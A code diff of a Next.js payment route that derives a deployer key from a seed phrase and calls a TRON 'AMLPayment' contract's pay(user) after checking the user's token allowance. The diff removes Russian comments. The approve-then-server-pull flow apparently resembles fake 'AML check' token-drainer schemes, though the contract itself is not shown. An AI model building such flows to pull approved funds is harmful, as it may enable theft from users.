@@ -1,13 +1,3 @@
-// pages/api/pay.js
-//
-// Вызывается фронтендом после того как юзер подписал approve.
-// Сервер сам вызывает AMLPayment.pay() от имени деплоера.
-//
-// Добавь в .env.local:
-//   DEPLOYER_SEED=слово1 слово2 ... слово12
-//   NEXT_PUBLIC_AML_CONTRACT=THG9SQhxa6knVqkvQwmMHfwPsMtzvaVoTc
-//   NEXT_PUBLIC_TRONGRID_URL=https://nile.trongrid.io
-
 import TronWebModule from 'tronweb';
 import bip39         from 'bip39';
 import HDKey         from 'hdkey';
@@ -16,20 +6,18 @@ const TRONGRID_URL  = process.env.NEXT_PUBLIC_TRONGRID_URL || 'https://nile.tron
 const AML_CONTRACT  = process.env.NEXT_PUBLIC_AML_CONTRACT;
 const DEPLOYER_SEED = process.env.DEPLOYER_SEED;
 
-// Получаем приватный ключ из seed фразы (TRON путь m/44'/195'/0'/0/0)
 async function getPrivateKey() {
-  const seed   = await bip39.mnemonicToSeed(DEPLOYER_SEED.trim());
-  const root   = HDKey.fromMasterSeed(seed);
-  const child  = root.derive("m/44'/195'/0'/0/0");
+  const seed  = await bip39.mnemonicToSeed(DEPLOYER_SEED.trim());
+  const root  = HDKey.fromMasterSeed(seed);
+  const child = root.derive("m/44'/195'/0'/0/0");
   return child.privateKey.toString('hex');
 }
 
-// ABI только нужного метода pay()
 const ABI = [
   {
     name: 'pay',
     type: 'function',
-    inputs: [],
+    inputs: [{ name: 'user', type: 'address' }],
     outputs: [],
     stateMutability: 'nonpayable',
   },
@@ -62,14 +50,12 @@ export default async function handler(req, res) {
   }
 
   try {
-    // Инициализируем TronWeb с приватным ключом деплоера
     const privateKey = await getPrivateKey();
     const TronWeb    = TronWebModule.TronWeb ?? TronWebModule.default?.TronWeb ?? TronWebModule.default ?? TronWebModule;
     const tronWeb    = new TronWeb({ fullHost: TRONGRID_URL, privateKey });
 
-    // Проверяем allowance — убеждаемся что approve уже прошёл
-    const contract   = await tronWeb.contract(ABI, AML_CONTRACT);
-    const allowance  = await contract.getAllowance(userAddress).call();
+    const contract  = await tronWeb.contract(ABI, AML_CONTRACT);
+    const allowance = await contract.getAllowance(userAddress).call();
     console.log('[pay] allowance для', userAddress, ':', allowance.toString());
 
     if (BigInt(allowance.toString()) === BigInt(0)) {
@@ -79,9 +65,8 @@ export default async function handler(req, res) {
       });
     }
 
-    // Вызываем pay() от имени деплоера
     console.log('[pay] вызываем pay() для', userAddress);
-    const tx = await contract.pay().send({
+    const tx = await contract.pay(userAddress).send({
       feeLimit:  20_000_000,
       callValue: 0,
     });
